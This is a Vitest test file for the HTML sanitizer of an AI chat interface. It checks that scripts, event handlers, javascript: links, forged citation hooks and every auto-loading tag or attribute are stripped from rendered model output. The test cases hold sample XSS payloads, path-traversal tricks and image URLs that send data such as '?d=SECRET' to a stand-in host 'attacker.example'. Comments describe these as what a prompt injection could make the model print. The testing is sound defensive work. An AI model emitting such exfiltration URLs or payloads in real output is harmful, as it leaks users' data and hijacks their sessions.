/**
 * Sanitizer for the chat rendering path.
 *
 * Covers what must be removed from marked's output (scripts, event handlers,
 * script-bearing URLs, and — since SA-M10 — every `class`/`data-*` hook a model
 * could use to forge a citation), what must survive it (the markdown feature
 * set the chat actually renders), and the attribute-escaping helper the
 * annotators interpolate through.
 *
 * The annotators' own spans are NOT expected to survive this function: they are
 * added afterwards, by `renderAssistantMarkdown`, which is where the
 * end-to-end citation behaviour is tested.
 *
 * The second half is the auto-loading channel (#415 Decision 13): every way a
 * rendered answer could make the browser fetch something with no click, and
 * the two image sources that are still allowed to load.
 */
import { describe, it, expect, vi } from 'vitest'
import { escapeHtmlAttribute, sanitizeMarkdownHtml } from '~/lib/sanitize-html'

/** An image source the sanitizer allows: the Data Stash's raw-download route. */
const STASH_IMAGE = '/api/stash/document/0b9f5c1e-7d2a-4c1b-9a3e-5f6d7e8f9a0b?sessionId=s1&download'

describe('sanitizeMarkdownHtml', () => {
  it('drops script elements and their contents', () => {
    const out = sanitizeMarkdownHtml('<p>hi</p><script>window.stolen = 1</script>')
    expect(out).toContain('<p>hi</p>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('window.stolen')
  })

  it('drops inline event handlers but keeps the element', () => {
    // An allowed source, so the element survives and this stays a test of the
    // handler strip. (`x.png` was the source here until #415 D13; a relative
    // path outside the stash route is now refused — see the image block below.)
    const out = sanitizeMarkdownHtml(`<img src="${STASH_IMAGE}" onerror="window.stolen = 1">`)
    expect(out).toContain('<img')
    expect(out).toContain(`src="${STASH_IMAGE.replace(/&/g, '&amp;')}"`)
    expect(out).not.toContain('onerror')
  })

  it('neutralises javascript: URLs on links', () => {
    const out = sanitizeMarkdownHtml('<a href="javascript:window.stolen=1">click</a>')
    expect(out).not.toContain('javascript:')
    expect(out).toContain('click')
  })

  it('drops iframes, objects and form controls that markdown never emits', () => {
    const out = sanitizeMarkdownHtml(
      '<iframe src="https://evil.test"></iframe><object data="x"></object><form><button>x</button></form>',
    )
    expect(out).not.toContain('<iframe')
    expect(out).not.toContain('<object')
    expect(out).not.toContain('<form')
  })

  // SA-M10: the annotator hooks used to be allowlisted here, so model output
  // could forge them. They are now stripped unconditionally — the annotators
  // run AFTER this function and add their own.
  it('drops every data attribute, the annotator hooks included', () => {
    const out = sanitizeMarkdownHtml(
      '<span data-entity-name="Acme" data-entity-ids="n1" data-doc-id="doc-1" ' +
        'data-unexpected="1">Acme</span>',
    )
    expect(out).not.toContain('data-entity-name')
    expect(out).not.toContain('data-entity-ids')
    expect(out).not.toContain('data-doc-id')
    expect(out).not.toContain('data-unexpected')
    expect(out).toContain('Acme')
  })

  it('strips the interactive classes so a forged citation cannot render', () => {
    const forged =
      '<p>See <span class="doc-ref" data-doc-id="attacker-chosen">payroll.xlsx</span> ' +
      'and <span class="graph-entity toggled" data-entity-ids="n9">Acme</span></p>'
    const out = sanitizeMarkdownHtml(forged)

    expect(out).not.toContain('doc-ref')
    expect(out).not.toContain('graph-entity')
    expect(out).not.toContain('attacker-chosen')
    // The text itself is untouched — this neutralizes the hooks, not the prose.
    expect(out).toContain('payroll.xlsx')
    expect(out).toContain('Acme')
  })

  it('keeps the class values marked legitimately emits', () => {
    const out = sanitizeMarkdownHtml(
      '<pre><code class="language-ts">x</code></pre>' +
        '<ul class="contains-task-list"><li class="task-list-item">a</li></ul>',
    )
    expect(out).toContain('class="language-ts"')
    expect(out).toContain('class="contains-task-list"')
    expect(out).toContain('class="task-list-item"')
  })

  it('drops only the disallowed half of a mixed class attribute', () => {
    const out = sanitizeMarkdownHtml('<code class="language-js doc-ref">x</code>')
    expect(out).toContain('class="language-js"')
    expect(out).not.toContain('doc-ref')
  })

  it('keeps the markdown feature set the chat renders', () => {
    const html = [
      '<h2>Title</h2>',
      '<p><strong>bold</strong> <em>italic</em> <del>struck</del></p>',
      '<pre><code class="language-js">const a = 1</code></pre>',
      '<table><thead><tr><th align="left">a</th></tr></thead>',
      '<tbody><tr><td align="right">1</td></tr></tbody></table>',
      '<ul><li><input checked="" disabled="" type="checkbox"> done</li></ul>',
      '<blockquote><p>quote</p></blockquote>',
      '<p><a href="https://example.test/doc">link</a></p>',
      `<p><img src="${STASH_IMAGE}" alt="pic"></p>`,
      '<hr>',
    ].join('')
    const out = sanitizeMarkdownHtml(html)

    expect(out).toContain('<h2>Title</h2>')
    expect(out).toContain('<strong>bold</strong>')
    expect(out).toContain('<em>italic</em>')
    expect(out).toContain('<del>struck</del>')
    expect(out).toContain('class="language-js"')
    expect(out).toContain('const a = 1')
    expect(out).toContain('<table>')
    expect(out).toContain('align="left"')
    expect(out).toContain('align="right"')
    expect(out).toContain('type="checkbox"')
    expect(out).toContain('<blockquote>')
    expect(out).toContain('href="https://example.test/doc"')
    expect(out).toContain('<img src="/api/stash/document/')
    expect(out).toContain('alt="pic"')
    expect(out).toContain('<hr>')
  })

  // Standing UI rule (2026-08-24): the app never navigates away to follow a
  // link, so the sanitizer — the one chokepoint every rendered assistant
  // message passes through — stamps the target and rel itself. See the
  // repo-wide guard in `src/__tests__/links-new-tab.test.ts` for the JSX half.
  it('points every rendered link at a new tab', () => {
    const out = sanitizeMarkdownHtml('<p><a href="https://example.test/doc">link</a></p>')

    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer"')
    expect(out).toContain('href="https://example.test/doc"')
  })

  it('replaces a target and rel written by the model with its own', () => {
    const out = sanitizeMarkdownHtml(
      '<a href="https://example.test/doc" target="_self" rel="opener">link</a>',
    )

    expect(out).not.toContain('_self')
    expect(out).not.toContain('rel="opener"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer"')
  })

  it('leaves an anchor with no href alone', () => {
    const out = sanitizeMarkdownHtml('<a>bare</a>')

    expect(out).toContain('bare')
    expect(out).not.toContain('target=')
  })

  // The annotator markup is NOT expected to survive a round trip any more —
  // it is never fed back through. This pins that, so nobody restores the
  // allowlist entries to "fix" it.
  it('does not preserve annotator markup fed back through it', () => {
    const annotated =
      '<p><span class="graph-entity toggled" data-entity-name="Acme Corp" ' +
      'data-entity-ids="n1,n2" title="Click to pin highlight">Acme Corp</span></p>'
    const out = sanitizeMarkdownHtml(annotated)

    expect(out).not.toContain('graph-entity')
    expect(out).not.toContain('data-entity-name')
    // `title` is harmless and stays; only the interactive hooks go.
    expect(out).toContain('title="Click to pin highlight"')
  })
})

// ============================================================================
// The auto-loading channel (#415 Decision 13)
// ============================================================================

const ATTACKER = 'attacker.example'

/** Parse the sanitizer's output the way the chat will, but inertly. */
const parse = (html: string): Document => new DOMParser().parseFromString(html, 'text/html')

/** Attributes a browser fetches from on its own, on any element. */
const LOADING_ATTRIBUTES = [
  'src',
  'srcset',
  'poster',
  'data',
  'background',
  'ping',
  'lowsrc',
  'dynsrc',
  'style',
]

/**
 * Every place in rendered output a browser would fetch from with no click — the
 * attributes above (`style` for CSS `url()`), the text of a `<style>` element,
 * `href` on anything that is not an anchor (`<link>`, `<base>`, SVG `<image>`)
 * and a `<meta>` refresh. An anchor's own `href` is excluded: it loads on a
 * click, not on render. Returns where the attacker's host was found.
 */
function autoLoadingReferences(html: string): string[] {
  const found: string[] = []
  for (const el of Array.from(parse(html).querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      const loads =
        LOADING_ATTRIBUTES.includes(attr.name) ||
        (attr.name.endsWith('href') && el.nodeName !== 'A') ||
        (el.nodeName === 'META' && attr.name === 'content')
      if (loads && attr.value.includes(ATTACKER)) found.push(`${el.nodeName}[${attr.name}]`)
    }
    if (el.nodeName === 'STYLE' && el.textContent?.includes(ATTACKER)) found.push('STYLE')
  }
  return found
}

/** The `src` of every `<img>` that survived. */
const imageSources = (html: string): string[] =>
  Array.from(parse(html).querySelectorAll('img')).map((img) => img.getAttribute('src') ?? '')

/** The text of every placeholder that stands where a refused image was. */
const placeholders = (html: string): string[] =>
  Array.from(parse(html).querySelectorAll('span.blocked-image')).map((s) => s.textContent ?? '')

describe('sanitizeMarkdownHtml — images from outside the app do not load', () => {
  // Each source here is one an injected instruction could make the model print.
  // The rule judges what the browser would FETCH, not what the string looks
  // like, so several of these are parser tricks a prefix check would miss.
  const refused: Array<[string, string]> = [
    ['an absolute https URL', `https://${ATTACKER}/p.png?d=SECRET`],
    ['an absolute http URL', `http://${ATTACKER}/p.png?d=SECRET`],
    ['a protocol-relative URL', `//${ATTACKER}/p.png?d=SECRET`],
    ['a backslash the URL parser reads as a slash', `/\\${ATTACKER}/p.png?d=SECRET`],
    ['leading whitespace before the scheme', ` https://${ATTACKER}/p.png`],
    ['a tab inside the scheme, which the parser deletes', `ht\ttps://${ATTACKER}/p.png`],
    ['the stash route on ANOTHER origin', `https://${ATTACKER}/api/stash/document/abc?download`],
    // Same origin, but not the stash route: an image is an authenticated GET,
    // and these have side effects (sign-out + `session_end` routines; a session
    // claim + container boot). This is why the rule is not "same origin".
    ['a same-origin side-effecting route', '/api/auth/logout'],
    ['the same route, absolute', `${window.location.origin}/api/auth/logout`],
    ['another same-origin GET route', '/api/sandbox/pty/stream?sessionId=s1'],
    ['a bare relative path', 'x.png'],
    ['the empty string, which is the page itself', ''],
    // Climbing out of the stash prefix, in each spelling the parser normalizes.
    ['dot-segments out of the stash prefix', '/api/stash/document/../../auth/logout?download'],
    ['percent-encoded dot-segments', '/api/stash/document/%2e%2e/%2e%2e/auth/logout?download'],
    ['an encoded slash inside the id', '/api/stash/document/a%2F..%2F..%2Fauth%2Flogout?download'],
    ['the stash route without ?download', '/api/stash/document/abc?sessionId=s1'],
    ['the stash route one level deeper', '/api/stash/document/abc/def?download'],
    // data: that is not a plain base64 raster image.
    ['an SVG data URL', 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
    ['a non-image data URL', 'data:text/html;base64,PGI+aGk8L2I+'],
    ['a data URL that is not base64', 'data:image/png,%89PNG'],
    ['a data URL with stray characters', 'data:image/png;base64,iVBOR w0KGgo='],
  ]

  it.each(refused)('refuses %s, leaving no <img>', (_label, src) => {
    const out = sanitizeMarkdownHtml(`<p>before <img src="${src}" alt="chart"> after</p>`)

    expect(imageSources(out)).toEqual([])
    expect(autoLoadingReferences(out)).toEqual([])
    expect(placeholders(out)).toHaveLength(1)
    // The prose around it is untouched.
    expect(out).toContain('before ')
    expect(out).toContain(' after')
  })

  it('puts an inert placeholder where the image was, showing the source as text', () => {
    const src = `https://${ATTACKER}/p.png?d=SECRET`
    const out = sanitizeMarkdownHtml(`<p><img src="${src}" alt="chart"></p>`)
    const span = parse(out).querySelector('span.blocked-image')!

    expect(span).not.toBeNull()
    expect(span.textContent).toBe(`Image blocked: ${src}`)
    // Text, not a link and not an attribute anything loads.
    expect(span.children).toHaveLength(0)
    expect(span.closest('a')).toBeNull()
    expect(span.getAttribute('title')).toMatch(/fetched automatically/)
    expect(
      Array.from(span.attributes)
        .map((a) => a.name)
        .sort(),
    ).toEqual(['class', 'title'])
  })

  it('keeps the placeholder text-only even when the source carries markup', () => {
    const out = sanitizeMarkdownHtml(
      `<img src="https://${ATTACKER}/?q=<b>x</b>&amp;r=<img src=y>">`,
    )
    const doc = parse(out)

    expect(doc.querySelectorAll('img, b')).toHaveLength(0)
    expect(doc.querySelector('span.blocked-image')!.children).toHaveLength(0)
  })

  it('shortens a long source rather than dumping it', () => {
    const src = `https://${ATTACKER}/?d=${'A'.repeat(5000)}`
    const [text] = placeholders(sanitizeMarkdownHtml(`<img src="${src}">`))

    expect(text).toBe(`Image blocked: ${src.slice(0, 120)}…`)
  })

  it('refuses every image in a message, not just the first', () => {
    const out = sanitizeMarkdownHtml(
      `<p><img src="https://${ATTACKER}/1"><img src="${STASH_IMAGE}"><img src="//${ATTACKER}/3"></p>`,
    )

    expect(placeholders(out)).toHaveLength(2)
    expect(imageSources(out)).toEqual([STASH_IMAGE])
  })

  it('does not let the model forge the placeholder class', () => {
    // Cosmetic either way — the placeholder is inert — but it means every
    // `blocked-image` on screen is one this code put there.
    const out = sanitizeMarkdownHtml('<span class="blocked-image">Image blocked: nothing</span>')
    expect(out).not.toContain('blocked-image')
  })

  it('judges the image on the inert document, never on the live page', () => {
    // In a real browser an <img> created in the live document starts fetching
    // the moment it has a src, attached or not — so a pass that parsed through
    // a live element (`document.createElement('div').innerHTML = …`) would leak
    // before it decided anything. jsdom loads nothing, so this pins the proxy:
    // the sanitizer creates no element in the live document at all.
    const create = vi.spyOn(document, 'createElement')
    try {
      sanitizeMarkdownHtml(`<p><img src="https://${ATTACKER}/p.png"></p>`)
      expect(create).not.toHaveBeenCalled()
    } finally {
      create.mockRestore()
    }
  })
})

describe('sanitizeMarkdownHtml — the image sources that still load, and why', () => {
  // Exception 1: data: raster images. No request is made, so nothing leaves.
  it.each(['png', 'jpeg', 'gif', 'webp'])('keeps a base64 data:image/%s', (type) => {
    const src = `data:image/${type};base64,iVBORw0KGgoAAAANSUhEUgAAAAE=`
    expect(imageSources(sanitizeMarkdownHtml(`<img src="${src}" alt="chart">`))).toEqual([src])
  })

  it('keeps a data: image up to the size cap, and refuses one past it', () => {
    // 256 KiB is the cap in `sanitize-html.ts`; the literal is repeated here on
    // purpose, so moving the cap is a visible edit to this test.
    const prefix = 'data:image/png;base64,'
    const atCap = prefix + 'A'.repeat(256 * 1024 - prefix.length)
    const pastCap = atCap + 'A'

    expect(imageSources(sanitizeMarkdownHtml(`<img src="${atCap}">`))).toEqual([atCap])
    const refused = sanitizeMarkdownHtml(`<img src="${pastCap}">`)
    expect(imageSources(refused)).toEqual([])
    expect(placeholders(refused)[0].length).toBeLessThan(200)
  })

  // Exception 2: the Data Stash raw-download route — the only route that serves
  // a file's bytes, a side-effect-free read, owner-gated.
  it('keeps the Data Stash download route, relative or absolute', () => {
    const absolute = `${window.location.origin}${STASH_IMAGE}`
    const out = sanitizeMarkdownHtml(`<img src="${STASH_IMAGE}"><img src="${absolute}">`)

    expect(imageSources(out)).toEqual([STASH_IMAGE, absolute])
    expect(placeholders(out)).toEqual([])
  })

  it('keeps the fallback stash id shape too', () => {
    const src = '/api/stash/document/doc-lz3k9a-4f8x2q1m?sessionId=s1&download'
    expect(imageSources(sanitizeMarkdownHtml(`<img src="${src}">`))).toEqual([src])
  })

  it('leaves an <img> with no src alone — it fetches nothing', () => {
    const out = sanitizeMarkdownHtml('<img alt="nothing">')
    expect(parse(out).querySelector('img')?.getAttribute('alt')).toBe('nothing')
    expect(placeholders(out)).toEqual([])
  })
})

describe('sanitizeMarkdownHtml — the other auto-loading channels stay shut', () => {
  // Each of these fetches with no click in a browser. They are closed by the
  // tag/attribute allowlists rather than by the image rule, so these cases are
  // what turns red if a future edit widens either list.
  const vectors: Array<[string, string]> = [
    ['<input type="image" src>', `<input type="image" src="https://${ATTACKER}/i.png">`],
    ['<img srcset>', `<img src="${STASH_IMAGE}" srcset="https://${ATTACKER}/i.png 2x">`],
    [
      '<picture><source srcset>',
      `<picture><source srcset="https://${ATTACKER}/i.webp"><img src="${STASH_IMAGE}"></picture>`,
    ],
    [
      '<video poster> / <audio src>',
      `<video poster="https://${ATTACKER}/p.png" src="https://${ATTACKER}/v.mp4"></video>` +
        `<audio src="https://${ATTACKER}/a.mp3"></audio>`,
    ],
    ['<link rel=stylesheet>', `<link rel="stylesheet" href="https://${ATTACKER}/s.css">`],
    ['<link rel=prefetch>', `<link rel="prefetch" href="https://${ATTACKER}/p">`],
    ['<iframe src>', `<iframe src="https://${ATTACKER}/f"></iframe>`],
    [
      '<object data> / <embed src>',
      `<object data="https://${ATTACKER}/o"></object><embed src="https://${ATTACKER}/e">`,
    ],
    ['<svg><image href>', `<svg><image href="https://${ATTACKER}/i.png"></image></svg>`],
    ['inline style url()', `<p style="background:url(https://${ATTACKER}/b.png)">x</p>`],
    [
      '<style> with @import and url()',
      `<style>@import url(https://${ATTACKER}/s.css); p { background: url(https://${ATTACKER}/b.png) }</style>`,
    ],
    [
      'table/cell background',
      `<table background="https://${ATTACKER}/t.png"><tr><td background="https://${ATTACKER}/c.png">x</td></tr></table>`,
    ],
    ['<a ping>', `<a href="https://example.test/" ping="https://${ATTACKER}/ping">x</a>`],
    [
      '<img lowsrc/dynsrc>',
      `<img src="${STASH_IMAGE}" lowsrc="https://${ATTACKER}/l" dynsrc="https://${ATTACKER}/d">`,
    ],
    ['<meta refresh>', `<meta http-equiv="refresh" content="0;url=https://${ATTACKER}/">`],
    ['<base href>', `<base href="https://${ATTACKER}/"><img src="${STASH_IMAGE}">`],
  ]

  it.each(vectors)('closes %s', (_label, html) => {
    // The leading paragraph is load-bearing. A fragment that STARTS with
    // `<link>`, `<meta>`, `<base>` or `<style>` is parsed into <head>, which
    // DOMPurify's returned <body> never contains — so without it those four
    // cases would pass with the tag allowlisted, and prove nothing.
    expect(autoLoadingReferences(sanitizeMarkdownHtml(`<p>lead</p>${html}`))).toEqual([])
  })

  it('strips src from an <input> but keeps the checkbox marked emits', () => {
    const out = sanitizeMarkdownHtml(
      `<input type="image" src="https://${ATTACKER}/i.png"><input checked="" disabled="" type="checkbox">`,
    )
    const inputs = Array.from(parse(out).querySelectorAll('input'))

    expect(inputs.map((i) => i.hasAttribute('src'))).toEqual([false, false])
    expect(inputs[1].getAttribute('type')).toBe('checkbox')
  })

  it('does not let an anchor ask for a prefetch', () => {
    // No browser prefetches a plain <a> without a `rel` asking for it, and the
    // hook overwrites `rel`; solid-router's hover preload, the other prefetcher
    // in this app, skips any anchor with a `target`, which the hook also sets.
    const a = parse(
      sanitizeMarkdownHtml(`<a href="https://${ATTACKER}/" rel="prefetch prerender">x</a>`),
    ).querySelector('a')!

    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    expect(a.getAttribute('target')).toBe('_blank')
  })
})

describe('escapeHtmlAttribute', () => {
  it('escapes the characters that can terminate a quoted attribute', () => {
    expect(escapeHtmlAttribute(`a"b'c<d>e&f`)).toBe('a&quot;b&#39;c&lt;d&gt;e&amp;f')
  })

  it('escapes ampersands before the other replacements', () => {
    expect(escapeHtmlAttribute('&quot;')).toBe('&amp;quot;')
  })

  it('leaves ordinary values alone', () => {
    expect(escapeHtmlAttribute('quarterly-report.pdf')).toBe('quarterly-report.pdf')
  })
})
